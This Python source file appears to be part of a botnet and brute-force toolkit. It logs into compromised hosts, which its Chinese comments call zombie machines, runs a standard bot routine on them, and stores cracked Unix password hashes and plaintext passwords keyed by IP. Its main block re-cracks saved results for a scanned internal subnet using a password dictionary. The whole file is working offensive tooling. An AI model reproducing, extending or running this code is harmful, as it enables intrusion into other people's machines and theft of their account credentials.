#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import os
import json
import global_var as gv
from brute import bruteUnixPasswd
from bot import botNet


def operate_bot(brute_info):
    """登录肉鸡，并操作

    :param brute_info:登录信息{'host': '1.2.3.4', 'user': 'root', 'ssh_type': 'password', 'key': None}
    :return:
    """
    brute_info.pop('time')
    bot = botNet.BotClient(**brute_info)
    bot.connect()
    bot.standard_operate()
    save_info(mode='crack_unix_passwd', filename=gv.BOT_PATH + gv.bot_info_file, info=bot.password_json, ip=bot.host)


def save_info(mode, filename, info, **kw):
    """存储信息

    :param mode:模式
    :param filename:存储文件名
    :param info:存储信息
    :param kw:附加信息
    :return:
    """
    if mode == 'scan_log':
        with open(filename, 'a') as logfile:
            json.dump(info, logfile)
            logfile.write('\n')
    elif mode == 'crack_unix_passwd':
        # 需要加锁
        if os.path.exists(filename):
            bot_info = json.load(open(filename, 'r'))
        else:
            bot_info = {}

        if 'ip' in kw:
            bot_info[info['ip']] = info
            account_info = bot_info[info['ip']]['account']
            for user in account_info:
                if account_info[user]['hash'] != info['account'][user]['hash']:
                    account_info[user]['hash'] = info['account'][user]['hash']
                if account_info[user]['password'] != info['account'][user]['password']:
                    account_info[user]['password'] = info['account'][user]['password']

        json.dump(bot_info, open(filename, 'w'), indent=4)
    elif mode == 'update':
        json.dump(info, open(filename, 'w'), indent=4)
    else:
        return None


def read_info(filename, path=gv.BOT_PATH):
    """读取原破解结果

    :param filename:
    :param path:
    :return:
    """
    if os.path.exists(path):
        bot_info = json.load(open(gv.BOT_PATH + filename, 'r'))
        return bot_info


def combine_info(file1, file2, combined_file, input_path1=gv.BOT_PATH, input_path2=gv.BOT_PATH,
                 output_path=gv.BOT_PATH):
    info1 = None
    info2 = None
    timestamp1 = 0
    timestamp2 = 0
    if os.path.exists(input_path1 + file1):
        info1 = json.load(open(input_path1 + file1, 'r'))
        timestamp1 = os.path.getmtime(input_path1 + file1)
    else:
        print('[-] Error: file:' + file1 + ' does not exist.')
        exit(-1)
    if os.path.exists(input_path2 + file2):
        info2 = json.load(open(input_path2 + file2, 'r'))
        timestamp2 = os.path.getmtime(input_path2 + file2)
    else:
        print('[-] Error: file:' + file1 + ' does not exist.')
        exit(-1)

    output_info = None
    if timestamp1 > timestamp2:
        info2.update(info1)
        info = info2
    else:
        info1.update(info2)
        info = info1
    json.dump(info, open(output_path + combined_file, 'w'), indent=4)


if __name__ == '__main__':
    # mess = json.load(open(gv.BOT_PATH + gv.bot_info_file, 'r'))
    info = read_info('10.108.36.71mask16.txt')
    info = bruteUnixPasswd.update_passwd_json(info, dic=gv.PASS_DICTIONARY)
    save_info(mode='update', filename=gv.BOT_PATH + '10.108.36.71mask16_new.txt', info=info)
    # print(json.dumps(info, indent=4))
    # combine_info(file1='10.108.36.71mask24.txt',
    #              file2='10.108.36.71mask16.txt',
    #              combined_file='10.108.36.71mask16.txt')
